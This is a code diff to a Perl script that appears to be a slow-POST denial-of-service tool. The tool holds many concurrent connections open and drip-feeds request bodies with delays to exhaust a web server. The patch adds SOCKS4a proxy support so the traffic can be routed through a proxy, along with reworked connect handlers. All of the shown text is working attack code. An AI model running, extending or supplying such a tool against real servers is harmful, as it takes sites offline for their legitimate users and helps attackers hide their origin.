@@ -22,7 +22,8 @@ Vitaly Kramskikh
 use strict;
 use warnings;
 
-use POSIX 'strftime';
+use Errno;
+use POSIX;
 
 use Getopt::Long;
 
@@ -39,6 +40,7 @@ my $body_send_delay = 2;
 my $connection_delay = 1;
 my $user_agent = '';
 my $ssl = 0;
+my $proxy;
 
 my $help;
 
@@ -57,6 +59,7 @@ Usage: $0 [options] hostname
                             (default: $connection_delay)
   --connection-delay=SEC    delay in seconds before reconnecting (default: $connection_delay)
   --user-agent=STRING       http user agent (default: no User-Agent header)
+  --socks-proxy=HOST:PORT   use specified SOCKS proxy
 
 HELP
 ;
@@ -72,8 +75,19 @@ GetOptions(
     'connection-delay=f' => \$connection_delay,
     'body-send-delay=f' => \$body_send_delay,
     'user-agent=s' => \$user_agent,
+    'socks-proxy=s' => \$proxy,
     'help' => \$help,
 );
+
+if (defined $proxy) {
+    if ($proxy =~ /^([\w\.\-]+):(\d+)$/) {
+        $proxy = [$1, $2];
+    } else {
+        print "Please specify proxy in HOST:PORT format\n\n";
+        print $help_message;
+        exit 1;
+    }
+}
 
 my $host = $ARGV[0];
 
@@ -98,11 +112,14 @@ foreach my $n (1 .. $concurrency) {
         min_body_size => $min_body_size,
         max_body_size => $max_body_size,
         user_agent => $user_agent,
+        proxy => $proxy,
     );
     
-    $client->connect;
-    
     push @clients, $client;
+}
+
+for my $client (@clients) {
+    $client->connect;
 }
 
 AnyEvent->loop;
@@ -132,7 +149,7 @@ sub connect {
     $self->{body} = 'A' x $self->{body_size};
     
     $self->{fh} = new AnyEvent::Handle(
-        connect => [$self->{host}, $self->{port}],
+        connect => $self->{proxy} || [$self->{host}, $self->{port}],
         on_error => sub {
             if ($self->{connected}) {
                 $self->log("Connection dropped, reconnecting (" .
@@ -150,24 +167,46 @@ sub connect {
                        " of $self->{body_size} bytes sent)");
             $self->reconnect;
         },
-        on_drain => sub {
-            $self->{send_delay_timer} = AnyEvent->timer(
-                after => $self->{body_send_delay},
-                cb => sub {$self->send_chunk},
-            )
-        },
-        on_connect => sub {
-            $self->{connected} = 1;
-            
-            $self->log('Connected! Body size is ' . $self->{body_size});
-            
-            $self->{fh}->starttls('connect') if $self->{ssl};
-            
-            $self->send_headers;
-            $self->send_chunk;
-        },
+        on_connect => $self->{proxy} ? sub {$self->_on_proxy_connect} : sub {$self->_on_server_connect},
         keepalive => 1,
     );
+}
+
+sub _on_proxy_connect {
+    my $self = shift;
+    
+    $self->{fh}->push_write(pack "CCnNZ*Z*", 4, 1, $self->{port}, 1, '', $self->{host});
+
+    $self->{fh}->push_read(chunk => 8, sub {
+        my ($fh, $chunk) = @_;
+        my ($status, $port, $ipn) = unpack "xCna4", $chunk;
+        
+        if ($status == 0x5a) {
+            $self->_on_server_connect;
+        } else {
+            $self->log("Proxy error, status code is 0x" . sprintf('%x', $status));
+            $self->reconnect($self->{connection_delay} * 5);
+        }
+    });
+}
+
+sub _on_server_connect {
+    my $self = shift;
+    
+    $self->{connected} = 1;
+    $self->log('Connected! Body size is ' . $self->{body_size});
+    
+    $self->{fh}->on_drain(sub {
+        $self->{send_delay_timer} = AnyEvent->timer(
+            after => $self->{body_send_delay},
+            cb => sub {$self->send_chunk},
+        )
+    });
+
+    $self->{fh}->starttls('connect') if $self->{ssl};
+    
+    $self->send_headers;
+    $self->send_chunk;
 }
 
 sub reconnect {
